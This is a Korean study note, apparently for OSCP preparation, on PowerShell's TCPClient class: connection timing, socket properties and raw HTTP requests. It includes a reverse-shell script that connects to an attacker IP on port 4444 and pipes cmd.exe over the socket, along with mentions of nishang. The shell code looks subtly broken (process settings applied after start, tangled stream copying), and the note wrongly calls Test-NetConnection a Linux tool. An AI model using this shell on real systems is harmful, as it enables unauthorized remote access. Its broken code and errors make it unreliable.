# PowerShell TCPClient

> `System.Net.Sockets.TCPClient`는 PowerShell에서 TCP 소켓을 다루는 .NET 클래스. 인자 없이 `New-Object`로 만들면 연결 없는 빈 객체가 되고, 연결은 명시적인 시점에만 발생한다. 리버스 셸과 포트 확인의 기본 블록.

## 핵심 개념: 객체 생성 ≠ 연결

- `New-Object System.Net.Sockets.TCPClient` (인자 없음) → 메모리에 객체만 생성, 네트워크 트래픽 0
- SYN 패킷 하나도 나가지 않으므로 방화벽/IDS에 흔적 없음, Wireshark에서도 안 보임
- 출력의 `Connected : False`가 연결 시도조차 안 했다는 증거
- 즉 "생성과 동시에 연결"이 아니라, 연결 시점은 코드가 명시적으로 결정

## 연결이 실제로 발생하는 세 가지 시점

- 메서드 호출: `$c.Connect('IP', 포트)` — DNS 조회 + SYN 전송, handshake가 끝날 때까지 블로킹 (동기)
- 생성자 오버로드: `New-Object System.Net.Sockets.TCPClient('IP', 포트)` — 생성 즉시 연결. 이 한 줄이 "생성 + 연결"을 동시에 처리해서 리버스 셸 코드가 이 형태를 씀
- 실패 동작: 대상이 닫혀있으면 예외 발생 (`No connection could be made because the target machine actively refused it`)
- 심화: `$c.BeginConnect(...)` 또는 `ConnectAsync()` — 비동기 연결, 백그라운드로 진행

## 출력 속성 읽는 법

- `Connected` — 마지막 작업 시점 기준 연결 상태. 주의: 상대가 먼저 끊어도 `True`로 남을 수 있어서 신뢰할 만한 확인 수단이 아님
- `Client` — 실제 통신을 담당하는 내부 `Socket` 객체
- `Available` — 읽기 대기 중인 수신 바이트 수 (연결 전엔 0)
- `ReceiveBufferSize` / `SendBufferSize` — 송수신 버퍼, 기본 64KB
- `ReceiveTimeout` / `SendTimeout` — 0이면 타임아웃 없음 (무한 대기)
- `LingerState` — `Close()` 후 미전송 데이터를 얼마나 유지할지
- `NoDelay` — `False`면 Nagle 알고리즘 켜짐 (작은 패킷 모아서 전송). 셸 인터랙션 지연의 원인이 되기도 함
- `ExclusiveAddressUse` — 포트를 다른 프로세스와 공유할지 여부

## 연결(Connection) vs 요청(Request)

- TCP 연결 = 3-way handshake (SYN → SYN/ACK → ACK) 완료까지. `Connected : True`면 여기까지 된 것
- HTTP GET 같은 "요청"은 애플리케이션 계층 데이터라서 소켓에 직접 써야 전송됨
- 그래서 포트 80에 `TCPClient('IP', 80)`으로 연결해도 웹서버 로그에 아무 기록이 없는 게 정상 — 전화 걸어서 연결만 하고 아무 말 안 한 상태
- 실제 요청 전송: `GetStream()`으로 스트림을 얻고, `StreamWriter`로 요청 라인을 쓴 뒤 `Flush()` (줄끔 빈 줄 하나로 헤더 끝을 알림)
- 응답 수신: `StreamReader`로 같은 스트림에서 읽기

```powershell
$c = New-Object System.Net.Sockets.TCPClient('대상IP', 80)
$s = $c.GetStream()
$w = New-Object IO.StreamWriter($s); $w.WriteLine("GET / HTTP/1.1"); $w.WriteLine("Host: 대상"); $w.WriteLine(""); $w.Flush()
$r = New-Object IO.StreamReader($s); $r.ReadToEnd()
$c.Close()
```

## 리버스 셸에서의 역할

- `TCPClient('공격자IP', 포트)` → `GetStream()` → 스트림 입출력을 프로세스 입출력에 파이프 → 셸 명령 전송 구조
- nishang의 `Invoke-PowerShellTcp`가 정확히 이 구조. 별도 툴 없이 PowerShell 기본 기능만으로 셸 확보 가능
- 상세 원라이너는 [reverse_shell.md](../../03-initial-access/shells/reverse-shell/reverse_shell.md) 참고

```powershell
# 공격자: nc -lvnp 4444 먼저 실행
$c = New-Object System.Net.Sockets.TCPClient('10.8.136.212',4444)
$s = $c.GetStream(); [byte[]]$b = 0..65535 | % {0}
$p = [System.Diagnostics.Process]::Start("cmd.exe")
$p.StartInfo.RedirectStandardInput = 1; $p.StartInfo.RedirectStandardOutput = 1
$p.StartInfo.UseShellExecute = 0; $p.Start()
$p.StandardInput.BaseStream.CopyTo($s)
$a = New-Object System.Diagnostics.Stopwatch
[void]$a.Start()
while ($a.Elapsed.TotalSeconds -le 10 -or -not $s.DataAvailable) {
  $s.Write($b,0,$b.Length); $s.Flush(); Start-Sleep -m 250
  $out = $p.StandardOutput; $out.BaseStream.CopyTo($s)
}
```

## 동작 직접 확인

- 인자 없이 생성 → Wireshark 캡처에 아무 패킷 없음 확인
- `.Connect()` 호출 직후 SYN → SYN/ACK → ACK 3개 확인
- 포트가 닫힌 대상이면 RST 응답 + 예외 메시지 확인
- Linux 쪽 비교 도구: `Test-NetConnection -ComputerName 대상 -Port 포트` (연결 확인 전용 cmdlet, 데이터 전송 불가)

## OSCP 시험 관점

- 시험 레벨: 포트 열림 확인은 `Test-NetConnection`, 리버스 셸은 `reverse_shell.md`의 검증된 원라이너 사용이 기본
- 시험 레벨: 대상이 Windows고 PowerShell만 쓸 수 있을 때 `TCPClient('내IP',포트)` 한 줄로 아웃바운드 확인 — 이그레스 필터 테스트에 유용
- 심화: `GetStream()` 직접 제어 (프로토콜 대화, 데이터 전송), `NoDelay`/타임아웃 튜닝, 비동기 연결은 시험 범위 밖 개념

---

마지막 업데이트: 2026-10-15
